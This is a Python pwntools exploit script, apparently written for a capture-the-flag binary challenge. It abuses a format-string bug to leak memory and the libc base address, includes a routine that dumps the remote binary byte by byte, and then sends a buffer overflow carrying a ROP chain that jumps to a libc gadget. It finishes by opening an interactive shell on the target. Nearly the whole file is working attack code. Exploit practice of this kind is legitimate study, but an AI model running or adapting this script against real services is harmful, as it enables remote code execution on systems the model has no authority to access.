#!/usr/bin/env python
import sys, os
from pwn import *

log.warning('Usage: ./exp.py [HOST] [PORT]')
#prog = os.path.dirname(os.path.abspath(__file__)).split('/')[-1]
#elf = ELF(prog)
#if not elf: log.warning('Cannot open ' + prog)
#libc = ELF('libc.so.6') if len(sys.argv) > 2 else elf.libc
#if not libc: log.warning('Cannot open libc.so.6')
HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
context.word_size = 64

def leak_addr(addr, ref=False):
    r.sendline('a'*0x28 + p64(addr))
    r.recv()
    r.sendline('%13$p') if ref else r.sendline('%13$s')
    leak = r.recv()[:-1]
    #log.info('{} -> {}'.format(hex(addr), hex(leak)))
    #log.info('{} -> {}'.format(hex(addr), leak.encode('hex')))
    return leak

def leak_elf(base=0x400000):
    global r
    while True:
        r = remote(HOST, PORT)
        buf = ''
        if base & 0xff == 0xa or base & 0xff == 0x6e:
            buf += '\x00'; base += 1
        leak = leak_addr(base)
        if len(leak) == 0:
            buf += '\x00'; base += 1
        else:
            buf += leak; base += len(leak)
        log.warning('base: ' + hex(base))
        r.close()
        open('./elf', 'ab').write(buf)


def leak(buf):
    r.sendline(buf)
    return r.recvline()


r = remote(HOST, PORT)

# leak libc_base
r.sendline('%14$s'.ljust(0x30, '\x00') + p64(0x600c78))
libc_base = u64(r.recv().strip().ljust(8, '\x00')) - 0x21a50
log.info('libc_base: ' + hex(libc_base))

#off = 0x16bf40
#r.sendline('%14$s'.ljust(0x30, '\x00') + p64(libc_base + off))
#leak = r.recv().strip()
#print leak.encode('hex')
#print leak

off = 267
pop_rdi = 0x4008e3
pop_rbp = 0x4006e0
fgets   = 0x400808
printf  = 0x40084f 
rbp     = 0x600d00

#exp = ''.join(['%{}$p:'.format(i) for i in range(off, off+50)]).ljust(0x808, 'a') + p64(0)
exp = ''.join(['%{}$p:'.format(i) for i in range(off, off+50)])
rop = flat(
    '%267$p'.ljust(0x818, 'a'), # confirm rip
    pop_rbp, rbp,
    #pop_rdi, 0x40040d, printf
    libc_base + 0x41374
)
r.sendline(rop)
print r.recv().split(':')
'''
#r = None
#leak_elf(int(sys.argv[3], 16))
print hex(u64(leak_addr(int(sys.argv[3], 16)).ljust(8, '\x00')))
'''

r.interactive()
